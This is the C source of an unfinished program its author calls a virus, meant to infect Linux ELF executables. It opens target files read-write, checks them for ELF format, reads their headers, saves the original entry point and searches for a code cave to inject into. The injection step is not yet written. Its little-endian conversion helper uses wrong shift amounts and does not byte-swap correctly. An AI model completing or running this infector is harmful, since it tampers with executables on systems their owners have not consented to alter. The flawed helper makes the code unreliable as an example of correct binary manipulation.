// virus.c
// written by Kate Rodionoff
// on 06/10/23
// virus that infects ELF executable files on Linux

// verify that file is an ELF executable
// find entry point
// inject simple code (to start with)

#include "include/ElfFile.h"
#include "include/CodeCave.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MIN_ARGS 2
#define MOV_RET_INSTR "\x80\xd2" // note: bytes are presented in reverse order

int main(int argc, char **argv) {
    if (argc < MIN_ARGS) {
        fprintf(stderr, "Too few arguments to call program\n");
        exit(0);
    }

    for (int i = 1; i < argc; i++) {
        int fd = open(argv[i], O_RDWR);

        if (!Elf(fd)) {
            close(fd);
            continue;
        }

        Elf64_Ehdr ehdr = ElfExtractHeader(fd);
        Elf64_Phdr phdr = ElfExtractProgramHeader(fd);

        // store the original return address
        Elf64_Addr original = ehdr.e_entry;

        CodeCave codeCave = FindCodeCave(fd, phdr);
        
    }
}

// converts an address into little endian
Elf64_Addr convertLittleEndian(Elf64_Addr addr) {
    // 0xffffffffffff0000
    uint64_t b0, b1, b2, b3, b4, b5, b6, b7;
    b0 = (addr & 0x00000000000000ff) << 56;
    b1 = (addr & 0x000000000000ff00) << 48;
    b2 = (addr & 0x0000000000ff0000) << 42;
    b3 = (addr & 0x00000000ff000000) << 36;
    b4 = (addr & 0x000000ff00000000) >> 8;
    b5 = (addr & 0x0000ff0000000000) >> 24;
    b6 = (addr & 0x00ff000000000000) >> 40;
    b7 = (addr & 0xff00000000000000) >> 56;

    return b0 | b1 | b2 | b3 | b4 | b5 | b6 | b7;
}

